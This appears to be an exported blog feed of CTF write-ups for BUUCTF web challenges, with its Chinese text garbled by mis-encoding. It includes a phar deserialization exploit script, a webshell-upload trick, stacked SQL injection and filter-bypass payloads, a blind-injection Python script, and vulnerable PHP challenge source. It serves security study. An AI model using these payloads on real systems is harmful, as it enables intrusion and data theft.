<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">	ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">	&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸Šä¼ &quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5($_SESSION[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">		$ext = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â€²â–½`ã€ƒ)&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.$file[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;</span>.$uploader.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="é¢„æœŸè§£">é¢„æœŸè§£</h4>
<p>Pharååºåˆ—åŒ–</p>
<p>å…ˆä»»æ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶è·å¾—tokençš„å€¼</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816122813.png" alt=""></p>
<p>ç”Ÿæˆpharæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$upload = <span class="keyword">new</span> Uploader();</span><br><span class="line">$upload-&gt;cmd = <span class="string">&quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line">$upload-&gt;Filename = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">$upload-&gt;token = <span class="string">&#x27;GXY063c630ae7ab41c6fd121cb4851620a3&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($upload); </span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>ç„¶åå°†ç”Ÿæˆçš„pharä¸Šä¼ </p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816123304.png" alt=""></p>
<p>å¾—åˆ°è·¯å¾„<code>/var/www/html/uploads/cdc81ac06b78e980da728ecd95e747a8/GXY063c630ae7ab41c6fd121cb4851620a3.txt</code></p>
<p>ç„¶åå°†è¿™ä¸ªè·¯å¾„å¸¦ä¸Š<code>phar://</code>ä½œä¸ºnameå‚æ•°çš„å€¼ï¼Œå†éšæ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå› ä¸º<code>$this-&gt;Filename</code>è¢«æˆ‘ä»¬æ‰‹å·¥æŒ‡å®šä¸ºpharï¼Œè§¦å‘äº†pharååºåˆ—åŒ–å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816123754.png" alt=""></p>
<h4 id="éé¢„æœŸè§£1">éé¢„æœŸè§£1</h4>
<p>å…³é”®çš„åœ°æ–¹åœ¨äºæ­£åˆ™å†™çš„æœ‰é—®é¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®é™…ä¸ŠåŒ¹é…çš„æ˜¯<code> .</code>ï¼ˆç©ºæ ¼ç‚¹ï¼‰ã€‚``upload()<code>å†…ï¼Œåªè¦æ–‡ä»¶å°äº1024ï¼Œå°±å°†ä¸Šä¼ æ–‡ä»¶åˆ°</code>$this-&gt;Filename`</p>
<p>é‚£æˆ‘ä»¬åªè¦ä½¿<code>$this-&gt;Filename</code>ä¸º<code>/var/www/html/uploads/shell.php</code>ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªtxtçš„ä¸€å¥è¯å³å¯getshell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200816122133.png" alt=""></p>
<h4 id="éé¢„æœŸè§£2">éé¢„æœŸè§£2</h4>
<p>ç”±äºè¿™è¡Œä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo file_get_contents($uploader);</span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ åä¼šæ˜¾ç¤ºå‡º<code>$uploader</code>è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥åªè¦ä½¿<code>$this-&gt;Filename</code>ä¸º<code>flag.php</code> ç„¶åéšä¾¿ä¼ ä¸ªä¸œè¥¿å°±ä¼šå¾—åˆ°flagäº†ã€‚</p>
<h2 id="MRCTF2020-Ezpop-Revenge">MRCTF2020 Ezpop_Revenge</h2>
<h3 id="TODO-v3">TODO</h3>
]]></content>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”SQLæ³¨å…¥</title>
    <url>/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨">å¼ºç½‘æ¯ 2019 éšä¾¿æ³¨</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>å †å æ³¨å…¥</li>
<li>é¢„ç¼–è¯‘è¯­å¥</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<h4 id="æ–¹æ³•ä¸€">æ–¹æ³•ä¸€</h4>
<p>åˆ¤æ–­æ³¨å…¥ç‚¹</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113111.png" style="zoom:67%;" />
<p>ä¹‹åè¿›è¡Œunionè”åˆæ³¨å…¥çš„æ—¶å€™å‘ç°äº†æ­£åˆ™è¿‡æ»¤ å‡ ä¹è¿‡æ»¤äº†æˆ‘ä»¬æ‰€æœ‰èƒ½ç”¨åˆ°çš„è¯­å¥</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113206.png" style="zoom:67%;" />
<p>å†å°è¯•å †å æ³¨å…¥ï¼Œ <code>show tables </code>æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸­çš„è¡¨å‘ç°äº†ä¸¤ä¸ªè¡¨</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113424.png" style="zoom:67%;" />
<p>çœ‹ä¸‹ä¸¤ä¸ªè¡¨çš„ç»“æ„å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;æŸ¥çœ‹wordsè¡¨çš„å­—æ®µ</span><br><span class="line">&#39;;show columns from words;# </span><br><span class="line">&#x2F;&#x2F;æŸ¥çœ‹1919810931114514è¡¨çš„å­—æ®µ</span><br><span class="line">&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113614.png" style="zoom:67%;" />
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618113642.png" style="zoom:67%;" />
<p>éªšå§¿åŠ¿å¼€å§‹äº†ï¼Œæˆ‘ä»¬é»˜è®¤æŸ¥è¯¢çš„è¡¨æ˜¯<code>word</code>è¡¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡<code>rename</code>è¯­å¥æŠŠ<code>words</code>è¡¨çš„è¡¨åæ”¹æˆ<code>words1</code>ï¼ŒæŠŠ<code>1919810931114514</code>çš„è¡¨åæ”¹æˆ<code>words</code>ï¼Œç„¶åå†ç”¨<code>alter</code>è¯­å¥æŠŠ<code>flag</code>å­—æ®µåæ”¹æˆ<code>id</code>å³å¯ã€‚ã€‚ã€‚ğŸ˜‚</p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#</span><br></pre></td></tr></table></figure>
<p>ç”¨ 1â€² or â€˜1â€™=â€™1 è®¿é—®ä¸€ä¸‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618120643.png" alt=""></p>
<h4 id="æ–¹æ³•äºŒ">æ–¹æ³•äºŒ</h4>
<p>ä½¿ç”¨MySQLé¢„å¤„ç†è¯­å¥ç»•è¿‡è¿‡æ»¤ã€‚</p>
<p>æˆ‘ä»¬è¿›è¡Œæ„é€ è¿™ä¸ªè¯­å¥:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);</span><br><span class="line">prepare sql from @a</span><br><span class="line">execute sql;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;set @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);prepare sql from @a;execute sql;# </span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618123618.png" alt=""></p>
<p>å¤§å°å†™ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;sEt @a&#x3D;concat(&quot;sel&quot;,&quot;ect flag from &#96;1919810931114514&#96;&quot;);Prepare hello from @a;execute hello;#</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200618123707.png" alt=""></p>
<h2 id="CISCN2019-Hack-world">CISCN2019 Hack world</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>Boolç›²æ³¨</li>
<li>Pythonè„šæœ¬ç¼–å†™</li>
<li>å¼‚æˆ–æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<p>æ¯æ¬¡ç¢°åˆ°è¿™ç§SQLæ³¨å…¥çš„é¢˜ç›®éƒ½æ²¡å¤ªå¤šæ€è·¯ã€‚</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620111314.png" style="zoom:50%;" />
<p>æ ¹æ®1å’Œ2è¿”å›ç»“æœçš„ä¸åŒï¼Œå¯èƒ½æ˜¯boolç›²æ³¨ï¼Œ<code>()</code>æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨å¤§éƒ¨åˆ†å‡½æ•°ã€‚</p>
<blockquote>
<p>ç©ºæ ¼ç»•è¿‡ï¼š<code>%09</code> <code>%0a</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>/**/</code> <code>/*!*/</code>æˆ–è€…ç›´æ¥tab</p>
</blockquote>
<p>ä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚</p>
<p>payloadç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;),1,2)</span><br></pre></td></tr></table></figure>
<p>å¦‚æœç­‰å·æˆç«‹çš„è¯ï¼Œé‚£ä¹ˆå°±è¿”å›<code>Hello, glzjin wants a girlfriend.</code>ï¼Œå¦‚æœä¸æˆç«‹é‚£ä¹ˆå°±è¿”å›<code>Do you want to be my girlfriend?</code>ï¼Œç”¨äºŒåˆ†æ³•ç¼–å†™ç›²æ³¨è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://a9475c38-821c-4b23-aa96-87730f0863fe.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (high + low) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;index&#125;,1))&gt;&#123;char&#125;,1,2)&quot;</span>.format(index=i, char=mid)</span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    result += chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<h3 id="æ‹“å±•ï¼šCTFå‡ ç§ç›²æ³¨çš„æ‰‹æ³•">æ‹“å±•ï¼šCTFå‡ ç§ç›²æ³¨çš„æ‰‹æ³•</h3>
<p><a href="https://www.anquanke.com/post/id/160584#h2-0">https://www.anquanke.com/post/id/160584#h2-0</a></p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk">CISCN2019 ååŒ—èµ›åŒº Day1 Web5 CyberPunk</h2>
<h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3>
<ul>
<li>æ–‡ä»¶åŒ…å«</li>
<li>äºŒæ¬¡æ³¨å…¥</li>
<li>æŠ¥é”™æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v3">è§£é¢˜</h3>
<p>æŸ¥çœ‹æºç æç¤º<code>index.php</code>æœ‰fileå‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨ä¼ªåè®®æ–‡ä»¶åŒ…å«ã€‚</p>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>confirm.php</code>ä¸­å¯¹è¾“å…¥çš„usernameå’Œphoneéƒ½è¿›è¡Œäº†è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¿½ç•¥äº†addresså­—æ®µã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = $_POST[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">&quot;å·²æäº¤è®¢å•&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢å•æäº¤æˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨<code>change.php</code>ä»æ•°æ®åº“ä¸­å–å‡ºäº†åœ¨<code>confirm.php</code>è¾“å…¥çš„<code>address</code>ï¼Œè¿™æ ·å°±é€ æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
